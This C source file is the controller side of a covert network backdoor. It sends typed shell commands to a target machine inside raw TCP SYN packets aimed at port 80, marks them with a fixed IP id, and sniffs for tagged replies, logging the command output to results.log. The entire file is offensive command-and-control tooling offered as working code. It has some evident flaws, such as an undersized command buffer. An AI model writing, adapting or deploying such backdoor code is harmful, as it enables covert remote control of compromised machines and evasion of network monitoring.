/**
 * client.c
 */

#include "client.h"

int main (int argc, char* argv[]) {

	int ipaddress;

	ipaddress = host_convert(argv[1]);

	backdoor_client((uint32)ipaddress, argv[2]);

	return 0;
}

void backdoor_client(uint32 ipaddress, char* protocol)
{
	client *cln;
	char *cmd;
	pthread_t pth_id;
	//int ipaddress;


	// pcap variables to determine source IP
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *pd;
	uint32_t srcip, netmask;

	// Can they run this?
	if (geteuid() != 0) {
		printf(
				"\nYou need to be root to run this.\n\nApplication Terminated!\n\n");
		exit(0);
	}

	// Check for correct arguments, and provide them with a usage.
	if(ipaddress == 0) {
		perror("Invalid IP Address");
	}

	if((strcmp(protocol,"TCP") != 0) && (strcmp(protocol,"UDP") != 0)
			&& (strcmp(protocol,"tcp") != 0) && (strcmp(protocol,"udp") != 0)) {
		perror("Invalid Protocol");
	}

	pthread_create(&pth_id, NULL, sniffer_thread, "ens33");

	// open the device for live capture
	if ((pd = pcap_open_live("ens33", BUFSIZ, 1, 0, errbuf)) == NULL) {
		printf("pcap_open_live(): %s\n", errbuf);
		exit(1);
	}

	// get network device source IP address and netmask
	if (pcap_lookupnet("ens33", &srcip, &netmask, errbuf) < 0) {
		printf("pcap_lookupnet(): %s\n", errbuf);
		exit(1);

	}

	char * addr;
	inaddr.s_addr = (unsigned long)srcip;
	addr = inet_ntoa(inaddr);
	printf("sock addr IP: %s \n", addr);

	cln = client_new(); 			// create and initialize a new client struct

	// set client structure
	cln->source_host = srcip;
	cln->source_port = 4098;
	cln->dest_host = ipaddress;
	cln->dest_port = 80;

	printf("source ip %u, dest ip: %u \n", srcip, ipaddress);

	/**
	 * Print out destination host information
	 */
	printf("\n\nSending commands to: \n");
	printf("============================\n\n");
	printf("Destination	: 	%u:%u\n", cln->dest_host, cln->dest_port);
	printf("Source		: 	%u:%u\n", cln->source_host, cln->source_port);

	printf("\n");

	// initialize random function
	srand(time(NULL) + getpid());

	cmd = malloc(sizeof(char*));

	while(1) {
		puts("\nEnter a command and hit enter or Ctrl+C to Exit");
		fgets(cmd, 4096, stdin);
		send_packets(cln, cmd);

		//sniffer_thread((void *)"em1");
	}

	pthread_join(pth_id, NULL);
	printf("\nExiting the Controller........\n\n");

	//return EXIT_SUCCESS;
}


client *client_new(void) {
	client *c = malloc(sizeof(client));
	c->source_host = 0;
	c->source_port = 2001;
	c->dest_host = 0;
	c->dest_port = 80; 	// DEFAULT PORT TO SEND PACKETS TO
	return c;
}

void packet_new(client *c, char *msg) {
	packets.ip.version = 4;
	packets.ip.ihl = 5;
	packets.ip.tos = 0;
	packets.ip.tot_len = 0;
	packets.ip.id = 0;
	packets.ip.frag_off = 0;
	packets.ip.ttl = 64;
	packets.ip.protocol = IPPROTO_TCP;
	packets.ip.check = 0;
	packets.ip.saddr = c->source_host;
	packets.ip.daddr = c->dest_host;

	packets.tcp.source = 0;
	packets.tcp.dest = 0;
	packets.tcp.seq = 0;
	packets.tcp.ack_seq = 0;
	packets.tcp.doff = 5;
	packets.tcp.res1 = 0;

	packets.tcp.fin = 0;
	packets.tcp.syn = 1;
	packets.tcp.rst = 0;
	packets.tcp.psh = 0;
	packets.tcp.ack = 0;
	packets.tcp.urg = 0;
	packets.tcp.res2 = 0;

	packets.tcp.window = htons(512);
	packets.tcp.check = 0;
	packets.tcp.urg_ptr = 0;

	// Add the data to the datagram
	// encrypt data
	//msg = (char *)xor_encrypt(msg);
	strcpy(packets.data, msg);

	packets.tcp.source = htons(c->source_port);

	packets.tcp.dest = htons(c->dest_port);

	packets.tcp.seq = 1 + (int) (10000.0 * rand() / (RAND_MAX + 1.0));

	packets.ip.id = htons(50001);

	packets.ip.tot_len = ((4 * packets.ip.ihl) + (4 * packets.tcp.doff)
			+ strlen(packets.data));

	packets.ip.check = in_cksum((unsigned short *) &packets.ip, 20);

	/* From synhose.c by knight */
	pseudo_header.source_address = packets.ip.saddr;
	pseudo_header.dest_address = packets.ip.daddr;
	pseudo_header.placeholder = 0;
	pseudo_header.protocol = IPPROTO_TCP;
	pseudo_header.tcp_length = htons(20);

	bcopy((char *) &packets.tcp, (char *) &pseudo_header.tcp, 20);
	/* Final checksum on the entire package */
	packets.tcp.check = in_cksum((unsigned short *) &pseudo_header, 32);
}

void send_packets(client *c, char *input) {
	int send_socket;
	struct sockaddr_in sin;

	packet_new(c, input);

	sin.sin_family = AF_INET;
	sin.sin_port = packets.tcp.dest;
	sin.sin_addr.s_addr = packets.ip.daddr;

	if ((send_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
		SystemFatal("send_packets(): socket: unable to create a socket.");
	}

	sendto(send_socket, &packets, packets.ip.tot_len, 0,
			(struct sockaddr *) &sin, sizeof(sin));
	printf("Sending Command: %s\n", input);

	close(send_socket);

}

void SystemFatal(char *msg) {
	printf("\n%s\n\n", msg);
	exit(EXIT_FAILURE);
}


/*-------- Checksum Algorithm (Public domain Ping) ----------------------*/
unsigned short in_cksum(unsigned short *addr, int len) {
	int nleft = len;
	int sum = 0;
	unsigned short *w = addr;
	unsigned short answer = 0;

	/*
	 * Our algorithm is simple, using a 32 bit accumulator (sum), we add
	 * sequential 16 bit words to it, and at the end, fold back all the
	 * carry bits from the top 16 bits into the lower 16 bits.
	 */
	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	/* 4mop up an odd byte, if necessary */
	if (nleft == 1) {
		*(unsigned char *) (&answer) = *(unsigned char *) w;
		sum += answer;
	}

	/* 4add back carry outs from top 16 bits to low 16 bits */
	sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
	sum += (sum >> 16); /* add carry */
	answer = ~sum; /* truncate to 16 bits */
	return (answer);
}

void *sniffer_thread(void *args) {
	char *device;
	char filter[256] = "";

	device = (char *) args;
	strcpy(filter, "tcp and dst port 80");

	if ((pd = open_pcap_socket(device, filter))) {
		//while (running) {
			if (pcap_loop(pd, 0, (pcap_handler) parse_packet, 0) < 0)
				printf("pcap_loop(): failed: %s\n", pcap_geterr(pd));
		//}
		//running = true;
	}

	return NULL;
}

pcap_t * open_pcap_socket(char *device, const char *filter) {
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *pd;
	uint32_t srcip, netmask;
	struct bpf_program bpf;

	// open the device for live capture
	if ((pd = pcap_open_live(device, BUFSIZ, 1, 0, errbuf)) == NULL) {
		printf("pcap_open_live(): %s\n", errbuf);
		return NULL;
	}

	// get network device source IP address and netmask
	if (pcap_lookupnet(device, &srcip, &netmask, errbuf) < 0) {
		printf("pcap_lookupnet(): %s\n", errbuf);
		return NULL;
	}

	// Covert the filter into a packet filter binary
	if (pcap_compile(pd, &bpf, (char *) filter, 0, netmask)) {
		printf("pcap_compile(): %s\n", pcap_geterr(pd));
		return NULL;
	}

	if (pcap_setfilter(pd, &bpf) < 0) {
		printf("pcap_setfilter(): %s\n", pcap_geterr(pd));
		return NULL;
	}

	return pd;

}

void parse_packet(u_char *user, struct pcap_pkthdr *packethdr, u_char *packet) {
	struct iphdr* iphdr;
	struct tcphdr* tcphdr;
	char *tcp_payload;
	int size_ip, size_tcp;

	iphdr = (struct iphdr*) (packet + sizeof(struct ether_header));
	tcphdr = (struct tcphdr*) (packet + sizeof(struct ether_header)
			+ sizeof(struct iphdr));

	size_ip = iphdr->ihl * 4;
	size_tcp = tcphdr->doff * 4;

	if (size_tcp < 20) {
		printf("INVALID TCP HEADER SIZE\n");
		return;
	}

	// hex of boss 626f7373
	if (ntohs(iphdr->id) == 5002) {
		file = fopen("results.log", "a+");
		tcp_payload = (char *) (packet + sizeof(struct ether_header) + size_ip
				+ size_tcp);

		// decrypt payload
		//tcp_payload = (char *)xor_decrypt(tcp_payload);
		fprintf(file, "Command Response: \n\n%s\n", tcp_payload);
		fprintf(file,"==================================================================\n\n");

		fclose(file);
		//running = false;
	}
}

unsigned int host_convert(char *hostname) {
	static struct in_addr i;
	struct hostent *h;
	i.s_addr = inet_addr(hostname);
	if (i.s_addr == -1) {
		h = gethostbyname(hostname);
		if (h == NULL) {
			fprintf(stderr, "cannot resolve %s\n", hostname);
			exit(0);
		}
		bcopy(h->h_addr, (char *) &i.s_addr, h->h_length);
	}
	return i.s_addr;
}

